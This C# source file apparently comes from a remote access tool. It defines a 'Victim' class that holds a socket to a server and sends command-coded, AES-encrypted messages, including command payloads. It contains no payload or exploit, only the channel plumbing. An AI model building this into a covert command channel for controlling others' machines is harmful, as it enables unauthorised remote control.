using System;
using System.Collections.Generic;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;

namespace winClient48
{
    public class Victim
    {
        public Socket socket;
        public static int MAX_BUFFER_LENGTH = 65536;
        public byte[] buffer = new byte[MAX_BUFFER_LENGTH];
        public string server_ip;
        public int server_port;

        //CRYPTOGRAPHY
        public (string public_key, string private_key) key_pairs;
        public (byte[] key, byte[] iv) _AES;

        public Victim(Socket socket)
        {
            this.socket = socket;
        }

        public void Send(int cmd, int param, byte[] msg)
        {
            if (msg != null)
            {
                byte[] buffer = new DSP((byte)cmd, (byte)param, msg).GetBytes();
                socket.BeginSend(buffer, 0, buffer.Length, SocketFlags.Partial, new AsyncCallback((ar) =>
                {
                    try
                    {
                        socket.EndSend(ar);
                    }
                    catch (Exception ex)
                    {
                        
                    }
                }), buffer);
            }
        }

        /// <summary>
        /// Send message string.
        /// </summary>
        /// <param name="cmd">Command code.</param>
        /// <param name="param">Parameter code.</param>
        /// <param name="msg">Message string.</param>
        public void Send(int cmd, int param, string msg)
        {
            Send(cmd, param, Encoding.UTF8.GetBytes(msg));
        }

        /// <summary>
        /// Send message via encrypted channel.
        /// </summary>
        /// <param name="cmd">Command code.</param>
        /// <param name="param">Parameter code.</param>
        /// <param name="data">Data string.</param>
        /// <param name="mode">Message mode.</param>
        public void encSend(int cmd, int param, string data, SendMode mode = SendMode.RAW)
        {
            string enc_data = Crypto.AESEncrypt(data, _AES.key, _AES.iv);
            Send(cmd, param, enc_data);
        }

        /// <summary>
        /// Send command string via encrypted channel.
        /// </summary>
        /// <param name="payload"></param>
        /// <param name="mode"></param>
        public void SendCommand(string payload, SendMode mode = SendMode.RAW)
        {
            encSend(2, 0, payload);
        }
    }
}
